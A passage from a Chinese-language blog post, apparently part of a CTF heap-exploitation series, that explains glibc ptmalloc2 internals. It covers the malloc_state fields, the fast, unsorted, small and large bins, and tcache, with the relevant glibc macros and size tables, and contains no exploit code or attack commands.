(((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>fastbinsY[NFASTBINS]</code><br>存放每个 <code>fast chunk</code> 链表头部的指针</li>
<li><code>top</code><br>指向分配区的 <code>top chunk</code></li>
<li><code>last_reminder</code><br>最新的 <code>chunk</code> 分割之后剩下的那部分</li>
<li><code>bins</code><br>用于存储 <code>unstored bin</code>，<code>small bin</code> 和 <code>large bin</code> 的 <code>chunk</code> 链表</li>
<li><code>binmap</code><br><code>ptmalloc2</code> 用 1 个 <code>bit</code> 来标识某一个 <code>bin</code> 中是否包含空闲 <code>chunk</code></li>
</ul>
<blockquote>
<p>注意：</p>
<p><code>main_arena</code> 的 <code>malloc_state</code> 并不是 <code>heap segment</code> 的一部分，而是一个全局变量，存储在 <code>libc.so</code> 的数据段</p>
</blockquote>
<hr>
<h2 id="bin-的种类"><a href="#bin-的种类" class="headerlink" title="bin 的种类"></a>bin 的种类</h2><blockquote>
<p>Glibc 为了让 <code>malloc</code> 可以更快找到合适大小的 <code>chunk</code>，用户 <code>free</code> 释放掉的 <code>chunk</code> 不会马上归还给系统，而是将该 <code>chunk</code> 根据大小加入到合适的 <code>bin</code> 中</p>
<p>当用户再一次通过 <code>malloc</code> 请求分配内存时，<code>ptmalloc2</code> 会试图在空闲的 <code>chunk</code> 中挑选一块合适的空间给用户，这样可以避免频繁的系统调用，降低内存分配的开销</p>
<p><code>bin</code> 的中文意思为垃圾桶，就像要删除的文件会先放入 Windows 的回收站一样不会立即删除，很生动形象了</p>
</blockquote>
<p><code>ptmalloc2</code> 会根据空闲的 <code>chunk</code> 的大小以及使用状态，将 <code>chunk</code> 初步放入相应的 <code>bin</code> 中，<code>bin</code> 的种类主要分为：</p>
<ul>
<li><code>fast bin</code></li>
<li><code>small bin</code></li>
<li><code>large bin</code></li>
<li><code>unsorted bin</code></li>
<li><code>tcache</code></li>
</ul>
<p>Glibc 提供了两个数组：<code>fastbinsY[]</code> 和 <code>bins[]</code> 用来存放这些 <code>bin</code></p>
<p>具体来说，可分为：</p>
<ul>
<li>10 个 <code>fast bin</code>，存储在 <code>fastbinsY[]</code> 中</li>
<li>1 个 <code>unsorted bin</code>，存储在 <code>bins[1]</code> 中</li>
<li>62 个 <code>small bin</code>，存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 中</li>
<li>63 个 <code>large bin</code>，存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 中</li>
</ul>
<p>其中虽然定义了 <code>bins[128]</code>，但是 <code>bins[0]</code> 和 <code>bins[127]</code> 其实是不存在的</p>
<p><code>chunk</code> 在 <code>bin</code> 上以链表的形式存放：（<code>fast bin</code> 是<strong>单链表</strong>，其他的 <code>bin</code> 都是<strong>双链表</strong>）</p>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出10.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出10.png)</p>
<hr>
<h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><blockquote>
<p><code>fast bin</code> 非常像高速缓存 cache，为了减少一些较小的 <code>chunk</code> 在合并、分割以及中间检查的过程中的开销，<code>ptmalloc2</code> 中专门设计了 <code>fast bin</code>，对应的变量就是 <code>malloc state</code> 中的 <code>fastbinsY[]</code> 数组，用于提高小内存分配效率</p>
<p><code>fast bin</code> 存储在 <code>fastbinsY[]</code> 处，是 10 个<strong>单链表</strong>（最后 3 个链表保留未使用）</p>
<p>对于<strong>高速缓存（Cache）</strong>：</p>
<p>它是一种用于存储和快速访问数据的硬件或软件组件。它的主要目的是提高数据的访问速度，减少延迟。以下是高速缓存的一些关键概念和功能：</p>
<ol>
<li><p><strong>原理</strong>：高速缓存利用局部性原理，即程序在访问某些数据后，很可能会在不久的将来再次访问相同的数据。基于这一原理，缓存存储了近期使用的数据。</p>
<p><strong>时间局部性（Temporal Locality）</strong>：</p>
<p>当某个数据被访问后，近期内再次访问该数据的可能性很高。比如，在循环结构中，程序可能会多次访问同一块数据。因此，缓存会保留近期使用过的数据，以便快速响应后续的访问请求。</p>
<p><strong>空间局部性（Spatial Locality）</strong>：</p>
<p>当某个数据被访问时，临近地址的数据在不久的将来也可能会被访问。例如，在数组或连续内存区域中，访问一个元素后，往往会访问它周围的元素。因此，缓存通常会预取一块数据，而不仅仅是单个数据项，从而提高数据访问的效率。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>时间局部性</strong>：在一个简单的循环中，访问同一个数组的元素多次。</p>
<p><strong>空间局部性</strong>：访问数组时，程序会依次访问相邻的元素。</p>
<h3 id="高速缓存的设计"><a href="#高速缓存的设计" class="headerlink" title="高速缓存的设计"></a>高速缓存的设计</h3><p>基于局部性原理，高速缓存的设计考虑了以下几个方面：</p>
<p><strong>缓存行（Cache Line）</strong>：缓存通常以固定大小的数据块存储，常见的大小是32字节或64字节，这样可以有效利用空间局部性。</p>
<p><strong>预取机制</strong>：一些高级的缓存系统会根据访问模式预测将来可能需要的数据，并提前将其加载到缓存中，以减少访问延迟。</p>
<p><strong>替换策略</strong>：如前所述，使用LRU或LFU等策略，确保缓存中保留高概率再次使用的数据。</p>
<p>通过利用局部性原理，高速缓存能够显著提高系统性能，降低内存访问的延迟。</p>
<p><strong>类型</strong>：</p>
<p><strong>指令缓存</strong>：存储CPU执行的指令。</p>
<p><strong>数据缓存</strong>：存储数据处理所需的数据。</p>
</li>
</ol>
</blockquote>
<ul>
<li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 64</code> 字节（64 位为 <code>32 ~ 128</code> 字节）</li>
<li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li>
<li><strong>采取 <code>LIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会更早地被分配）</li>
<li><code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 <code>chunk</code> 的 <code>P</code> 位）总为 1，释放到 <code>fastbin</code> 的 <code>chunk</code> 不会被清除 <code>PREV_INUSE</code> 标志位</li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出11.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出11.png)</p>
<p>如果遇到以下两种情况，<code>ptmalloc2</code> 会首先判断 <code>fast bin</code> 中相应的 <code>bin</code> 中是否有对应大小的空闲块，如果有的话，就会直接从这个 <code>bin</code> 中获取 <code>chunk</code>；如果没有的话，<code>ptmalloc2</code> 才会做接下来的一系列操作：</p>
<ul>
<li>在 32 位系统中（<code>SIZE_SZ = 4</code>），用户需要的 <code>chunk</code> 大小 &lt; 64 字节</li>
<li>在 64 位系统中（<code>SIZE_SZ = 8</code>），用户需要的 <code>chunk</code> 大小 &lt; 128 字节</li>
</ul>
<p>关于 <code>fast bin</code> 的大小定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MXFAST </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br></pre></td></tr></table></figure>

<p>在 32 位系统中，<code>fast bin</code> <strong>默认支持</strong>最大的 <code>chunk</code> 的数据空间大小为 64 字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_MXFAST = (<span class="number">64</span> * <span class="number">4</span> / <span class="number">4</span>) = <span class="number">64</span></span><br></pre></td></tr></table></figure>

<p>但是其<strong>可以支持</strong>的 <code>chunk</code> 的数据空间最大为 80 字节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAX_FAST_SIZE = (<span class="number">80</span> * <span class="number">4</span> / <span class="number">4</span>) = <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p><strong><code>fast bin</code> 最多可以支持的 <code>bin</code> 的个数为 10 个</strong>，在 32 位系统中，用户数据空间从第 8 字节开始一直到第 80 字节（不包括 <code>prev_size</code> 和 <code>size</code> 字段的 8 字节）</p>
<blockquote>
<p>注意：</p>
<p><strong>fast bin 中的 <code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 chunk 的 P 位）始终被置为 1</strong>，因此它们不会和其它被释放的 <code>chunk</code> 合并，这也是为什么前面说 fast bin 是个特例，不会轻易合并</p>
<p>但是，当释放的 <code>chunk</code> 与该 <code>chunk</code> 相邻的空闲 <code>chunk</code> 合并后的大小 &gt; <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 时，说明内存碎片较多，此时就需要把 <code>fast bin</code> 中的 <code>chunk</code> 都进行合并，以减少内存碎片对系统的影响</p>
</blockquote>
<hr>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote>
<p><code>unsorted bin</code> 非常像缓冲区 buffer，可以视为空闲 <code>chunk</code> 回归其所属 <code>bin</code> 之前的缓冲区</p>
<p>大小超过 <code>fast bin</code> 阈值的 <code>chunk</code> 被释放时会加入到这里，这使得 <code>ptmalloc2</code> 可以复用最近释放的chunk，从而提升效率</p>
</blockquote>
<ul>
<li><code>unsorted bin</code> 处于 <code>bins[1]</code> 处，因此 <code>unsorted bin</code> 只有 1 个<strong>双向循环链表</strong></li>
<li><code>unsorted bin</code> 中的空闲 <code>chunk</code> 处于<strong>乱序状态</strong></li>
<li>**<code>unsorted bin</code> 在使用的过程中，采用的遍历顺序是 <code>FIFO</code>**（插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取）</li>
<li>在 <code>malloc</code> 分配时，如果在 <code>fast bin</code>、<code>small bin</code> 中找不到对应大小的 <code>chunk</code>，就会尝试从 <code>unsorted bin</code> 中寻找 <code>chunk</code>。如果取出来的 <code>chunk</code> 大小刚好满足，就会直接返回给用户；如果在 <code>unsorted bin</code> 中没有合适的 <code>chunk</code>，就会把 <code>unsorted bin</code> 中的所有 <code>chunk</code> 分别加入到所属的 <code>bin</code> 中，然后再在 <code>bin</code> 中分配合适的 <code>chunk</code></li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出14.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出14.png)</p>
<blockquote>
<p>当 <code>free</code> 的 <code>chunk</code> 大小 &gt;&#x3D; 144 字节时，为了效率，Glibc 并不会马上将 <code>chunk</code> 放到相对应的 <code>bin</code> 中，而会先放到 <code>unsorted bin</code></p>
<p>下次 <code>malloc</code> 时会先查找 <code>unsorted bin</code> 中是否有合适的 <code>chunk</code>，找不到才会去对应的 <code>bin</code> 中寻找，此时会顺便把 <code>unsorted bin</code> 的 <code>chunk</code> 放到对应的 <code>bin</code> 中，但 <code>small bin</code> 除外，为了效率，反⽽先从 <code>small bin</code> 找</p>
</blockquote>
<hr>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size` 小于 `0x200` 字节（64 位为 `0x400` 字节）的 `chunk` 叫做 `small chunk`，而 `small bin` 存放的就是这些 `small chunk</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><code>small bin</code> 存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 处，是 62 个<strong>双向循环链表</strong>（每个链表都有链表头结点，这样可以方便对于链表内部结点的管理）</li>
<li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 496</code> 字节（64 位为 <code>32 ~ 1008</code> 字节）</li>
<li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li>
<li><em>每个链表中存储的 <code>chunk</code> 大小都一致</em></li>
<li><strong>采取 <code>FIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会被最后分配），这点和 <code>fast bin</code> 相反</li>
<li>同样与 <code>fast bin</code> 相反的是：<em>相邻的空闲 <code>chunk</code> 会被合并</em></li>
</ul>
<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出12.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出12.png)</p>
<p><code>small bin</code> 中每个 <code>chunk</code> 的大小与其所在的 <code>bin</code> 的 <code>index</code> 的关系为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk_size = <span class="number">2</span> * SIZE_SZ * index</span><br></pre></td></tr></table></figure>

<p><code>small bin</code> 的大小再分成 62 个 <code>bin</code>，大小从 16 字节（64 位为 32 字节）开始，每次固定增加 8 字节（64 位为 16 字节）：</p>
<table>
<thead>
<tr>
<th>下标 index</th>
<th>SIZE_SZ&#x3D;4（32 位）</th>
<th>SIZE_SZ&#x3D;8（64 位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>3</td>
<td>24</td>
<td>48</td>
</tr>
<tr>
<td>4</td>
<td>32</td>
<td>64</td>
</tr>
<tr>
<td>5</td>
<td>40</td>
<td>80</td>
</tr>
<tr>
<td><code>x</code></td>
<td><code>2 * 4 * x</code></td>
<td><code>2 * 8 * x</code></td>
</tr>
<tr>
<td>63</td>
<td>504</td>
<td>1008</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：</p>
<p><code>fast bin</code> 中的 <code>chunk</code> 是有可能被放到 <code>small bin</code> 中去的</p>
</blockquote>
<hr>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">large bin` 存放的是大于等于 `0x200` 字节（64 位为 `0x400` 字节）的 `chunk</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><code>large bin</code> 存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 处，是 63 个<strong>双向循环链表</strong></li>
<li><em>每个 bin 中的 chunk 的大小不一致（按大小降序排列）</em></li>
<li><strong>采取 <code>FIFO</code> 策略</strong></li>
<li>插入和删除可以发生在任意位置</li>
<li>相邻空闲 <code>chunk</code> 会被合并</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">large bin` 的 `freed chunk` 会多两个指针 `fd_nextsize`、`bk_nextsize`，分别指向前一块和后一块 `large chunk</span><br></pre></td></tr></table></figure>

<p>[<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="CTF - PWN_堆与堆溢出13.png">](<a target="_blank" rel="noopener" href="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF">https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF</a> - PWN_堆与堆溢出13.png)</p>
<p><code>large bin</code> 的大小再分成 63 个 <code>bin</code>，但大小不再是固定大小增加，而是按照公差分为 6 组：</p>
<table>
<thead>
<tr>
<th>组</th>
<th>bin 的数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>0x40</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>0x200</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>0x1000</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>0x8000</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>0x40000</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制，大小和 large bin 剩余的大小相同</td>
</tr>
</tbody></table>
<hr>
<h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><blockquote>
<p><code>tcache</code> 是 libc2.26（Ubuntu 17.10）之后引进的一种新机制，类似于 <code>fast bin</code> 一样的东西，目的是提升堆管理的性能，但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式</p>
</blockquote>
<ul>
<li>每条链上最多可以有 7 个 <code>chunk</code></li>
<li><code>malloc</code> 的时候优先去 <code>tcache</code> 找</li>
<li><code>free</code> 的时候当 <code>tcache</code> 满了才放入 <code>fastbin</code> 或 <code>unsorted bin</code></li>
</ul>
<p>基本工作方式：</p>
<ul>
<li><code>malloc</code> 时，会先 <code>malloc</code> 一块内存用来存放 <code>tcache_perthread_struct</code></li>
<li><code>free</code> 内存，且 <code>size</code> 小于 <code>small bin size</code> 时<ol>
<li>先放到对应的 <code>tcache</code> 中，直到 <code>tcache</code> 被填满（默认是 7 个）</li>
<li><code>tcache</code> 被填满之后，再次 <code>free</code> 的内存和之前一样被放到 <code>fast bin</code> 或者 <code>unsorted bin</code> 中</li>
<li><code>tcache</code> 中的 <code>chunk</code> 不会合并（不取消 <code>PREV_INUSE</code> 位）</li>
</ol>
</li>
<li><code>malloc</code> 内存，且 <code>size</code> 在 <code>tcache</code> 范围内<ol>
<li>先从 <code>tcache</code> 取 <code>chunk</code>，直到 <code>tcache</code> 为空</li>
<li><code>tcache</code> 为空后，从 <code>bin</code> 中找</li>
<li><code>tcache</code> 为空时，如果 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中有 <code>size</code> 符合的 <code>chunk</code>，会先把 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中的 <code>chunk</code> 放到 <code>tcache</code> 中，直到填满；之后再从 <code>tcache</code> 中取；因此 <code>chunk</code> 在 <code>bin</code> 中和 <code>tcache</code> 中的顺序会反过来</li>
</ol>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
